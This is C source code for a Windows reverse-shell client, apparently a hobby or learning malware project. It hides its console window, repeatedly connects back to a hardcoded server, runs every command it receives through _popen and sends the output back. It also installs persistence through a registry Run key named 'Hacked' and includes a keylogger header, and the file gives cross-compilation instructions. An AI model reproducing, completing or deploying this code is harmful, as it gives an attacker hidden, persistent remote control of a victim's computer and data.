#include "library.h"
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h> // for sleep
#include <winsock2.h> // for socket
#include <windows.h>
#include <winuser.h> // for MessageBox
#include <wininet.h> // for InternetOpen
#include <windowsx.h> // for GET_X_LPARAM
#include <time.h>
#include <sys/stat.h> // for mkdir
#include <sys/types.h> // for mkdir

#include "keylogger.h"
#define bzero(p, size) (void) memset((p), 0, (size)) // define bzero


/// install Mingw-w64 on linux box to run windows executables
/// apt install minggw-w64
/// to compile BUILD in linux: i686-w64-mingw32-gcc -o client.exe library.c -lwsock32 -lwininet
///
///
///

int sock;

// STORES THE PROGRAM IN REGISTRY SO IT CAN BEBOOTED AT START (REG_VAL = "HACKED")
int startAtBoot() {

    char err[128] = "[-] failed to add program to registry \n";
    char suc[128] = "[!] success: created persistance at : HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\n";

    TCHAR szPath[MAX_PATH]; // buffer to store the path
    DWORD pathLen = 0; // length of the path

    pathLen = GetModuleFileName(NULL, szPath, MAX_PATH); // get the path of the program
    if (pathLen == 0) {
        send(sock, err, sizeof(err), 0);
        return -1;
    }

    // open the registry key, if it fails, send an error message, then set value to the path of the program
    HKEY NewVal;
    if (RegOpenKey(HKEY_CURRENT_USER, TEXT("Software\\Microsoft\\Windows\\CurrentVersion\\Run"), &NewVal) != ERROR_SUCCESS) {
        send(sock, err, sizeof(err), 0);
        return -1;
    }

    DWORD pathLenInBytes = pathLen * sizeof(*szPath);
    if (RegSetValueEx(NewVal, TEXT("Hacked"), 0, REG_SZ, (LPBYTE)szPath, pathLenInBytes) != ERROR_SUCCESS) {
        RegCloseKey(NewVal);
        send(sock, err, sizeof(err), 0);
        return -1;
    }


    RegCloseKey(NewVal);
    send(sock, suc, sizeof(suc), 0);
    return 0;
}


char *
    str_cut(char str[], int slice_from, int slice_to) // function to   certain parts of the string based on the slice_from and slice_to
{
    if(str[0] == '\0') return NULL; // if the string is empty, return NULL

    char *buffer; // buffer to store the string
    size_t str_len, buffer_len; // size of the string and buffer

    if (slice_to < 0 && slice_from > slice_to) { // if the slice_to is less than 0 and slice_from is greater than slice_to
        str_len = strlen(str); // get the length of the string
        if (-slice_to > str_len) slice_to = -str_len; // if the negative slice_to is greater than the length of the string, set the slice_to to the negative length of the string
        slice_to += str_len; // add the length of the string to the slice_to
        buffer_len = slice_to - slice_from; // get the length of the buffer
        str += slice_from; // add the slice_from to the string
    } else if (slice_from >= 0 && slice_to > slice_from) { // if the slice_from is greater than or equal to 0 and slice_to is greater than slice_from
        str_len = strlen(str); // get the length of the string
        if (slice_from > str_len) slice_from = str_len; // if the slice_from is greater than the length of the string, set the slice_from to the length of the string
        if (slice_to > str_len) slice_to = str_len; // if the slice_to is greater than the length of the string, set the slice_to to the length of the string
        buffer_len = slice_to - slice_from; // get the length of the buffer
        str += slice_from; // add the slice_from to the string
    } else return NULL; // if the slice_to is less than 0 and slice_from is greater than slice_to, return NULL)

    buffer = calloc(buffer_len, sizeof(char)); // allocate memory for the buffer
    strncpy(buffer, str, buffer_len); // copy the string to the buffer
    return buffer; // return the buffer
}

void Shell() // function to execute the command and send the output to the server
{
    char buffer[1024]; // buffer to store the command
    char container[1024]; // buffer to store the command output
    char total_response[18384]; // buffer to store the total response

    while (1) { // infinite loop to keep the connection open and receive the command from the server
        jump:
        // memset(buffer, 0, sizeof(buffer)); // clear the buffer
        // memset(container, 0, sizeof(container)); // clear the container
        // memset(total_response, 0, sizeof(total_response)); // clear the total response

        // bzero to clear the buffers
        bzero(buffer, 0, sizeof(buffer));
        bzero(container, 0, sizeof(container)); //
        bzero(total_response, 0, sizeof(total_response)); //

        recv(sock, buffer, sizeof(buffer), 0); // receive the command from the server

        // compare the command with the following commands
        // if the command is q, close the connection

        if (strncmp("q", buffer, 1) == 0) {
            // if the command is q, close the connection
            closesocket(sock);
            WSACleanup(); // clean up the Winsock library
            exit(0);
        }
        if (strncmp("cd ", buffer, 3) == 0) { // if the command is cd, change the directory
                chdir(str_cut(buffer,3,100)); // change the directory
            }
        else if (strncmp("persist", buffer, 7) == 0) {
            startAtBoot(); // start the client at boot
        }

        else if (strncmp("ls ", buffer, 3) == 0) {
                FILE *fp; // file pointer
                fp = _popen(buffer, "r"); // execute the command

                while (fgets(container, sizeof(container), fp) != NULL) { // read the output of the command
                    strcat(total_response, container); // append the output to the total response
                }

                send(sock, total_response, sizeof(total_response), 0); // send the total response to the server
                fclose(fp); // close the file
            }

        else {
            FILE *fp; // file pointer
            fp = _popen(buffer, "r"); // execute the command

            while (fgets(container, sizeof(container), fp) != NULL) { // read the output of the command
                strcat(total_response, container); // append the output to the total response
            }

            send(sock, total_response, sizeof(total_response), 0); // send the total response to the server
            fclose(fp); // close the file
        }
    }
}

// APIENTRY for WinMain and stdcall for MessageBox
int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow){

    // Hide the console window
    HWND stealth; // Declare a window handle
    AllocConsole(); // Create a console window
    stealth = FindWindowA("ConsoleWindowClass", NULL); // Hide the console window

    ShowWindow(stealth, 0); // Hide the console window

    // Create socket  object to connect to the server
    struct sockaddr_in ServAddr; // AF_INET for IPv4 and SOCK_STREAM for TCP
    unsigned short servePort;
    char *ServIP;

    WSADATA wsaData;

    ServIP = "192.168.1.1" ;// change
    servePort = 50005; // change

    // MAKEWORD takes two bytes as a paramter and  makes it into a  16 byte word
    // WSASTARTUP function itiates WinSOCK DLL
    // it takes two parameters, the version of the windows socket and a pointer to the WSADATA, use MAKEWORD(2,0) for version 2.0

    if (WSAStartup(MAKEWORD(2,0), &wsaData) != 0){
        MessageBox(NULL, "WSAStartup failed", "Error", MB_OK | MB_ICONERROR);
        exit(1);
    }


    sock = socket(AF_INET, SOCK_STREAM, 0);     // define the socket object
    memset(&ServAddr, 0, sizeof(ServAddr)); // clear the memory of the socket object
    ServAddr.sin_family = AF_INET; // set the family of the socket object
    ServAddr.sin_addr.s_addr = inet_addr(ServIP); // set the IP address of the socket object, converts the IP address to binary
    ServAddr.sin_port = htons(servePort); // set the port of the socket object converts the port to binary

    if (sock == INVALID_SOCKET){
        MessageBox(NULL, "Socket failed", "Error", MB_OK | MB_ICONERROR);
        exit(1);
    };

    // connect to the server  if the connection fails, try again after 10 seconds
    start:
    while (connect(sock, (struct sockaddr *) &ServAddr, sizeof(ServAddr)) != 0) {
        sleep(10);
        goto start; //
    }

    Shell();

}
